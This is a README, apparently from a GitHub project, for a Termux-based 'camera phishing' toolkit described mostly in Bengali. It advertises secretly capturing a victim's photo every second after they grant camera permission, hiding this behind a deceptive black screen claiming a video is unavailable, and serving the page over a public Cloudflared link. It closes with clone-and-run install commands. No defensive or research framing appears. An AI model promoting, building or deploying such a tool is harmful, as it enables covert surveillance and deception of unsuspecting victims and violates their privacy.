<h1 align="center">
  ⚡ CBX‑Camera‑Tool ⚡
</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Developed‑By‑ZombieNoyon‑red?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Platform‑Termux‑blue?style=for-the-badge&logo=android" />
  <img src="https://img.shields.io/badge/Purpose‑Camera‑Phishing‑black?style=for-the-badge" />
</p>

---

## 🚨 Overview

**CBX‑Camera‑Tool** একটি Termux‑ভিত্তিক Camera Phishing Toolkit যা:

- 🎥 Victim থেকে ক্যামেরা পারমিশন নেয় ও প্রতি সেকেন্ডে ছবি ক্যাপচার করে  
- 🌑 Black screen UI দেখায় যাতে ভিকটিম বুঝতে না পারে  
- 📂 ক্যাপচার হওয়া ছবি `captures/` ফোল্ডারে সেভ হয়  
- 🔗 Cloudflared দিয়ে এক‑ক্লিকে `https://…trycloudflare.com` লিংক তৈরি করে

---

## 📋 Features

| Feature                      | Description                                                    |
|-----------------------------|----------------------------------------------------------------|
| 🎯 **Camera Permission**     | ক্যামেরা মডিউল চালু করে, ভিকটিমের অনুমতি নেয়               |
| 🕵️‍♂️ **1‑Second Capture**    | প্রতি ১ সেকেন্ডে ফটো তোলা হয়                                |
| ⚠️ **Deceptive UI**          | Victim দেখবে শুধু 1 টেক্সট: “ভিডিওটি পাওয়া যাচ্ছে না”      |
| ☁️ **Public HTTPS Link**     | Cloudflared দিয়ে স্বয়ংক্রিয়ভাবে   HTTPS URL জেনারেট হয়        |
| 🗂️ **Local Storage**         | সব ছবি সেভ হয় `captures/` ফোল্ডারে                           |

---

## 🚀 Install & Run

```bash
# ক্লোন করো রিপো
git clone https://github.com/Mdnoyon14/cbx-camera-tool
cd cbx-camera-tool

# 실행যোগ্য ফাইল বানাও
chmod +x start.sh

# বিল্ড ও রান করো
./start.sh
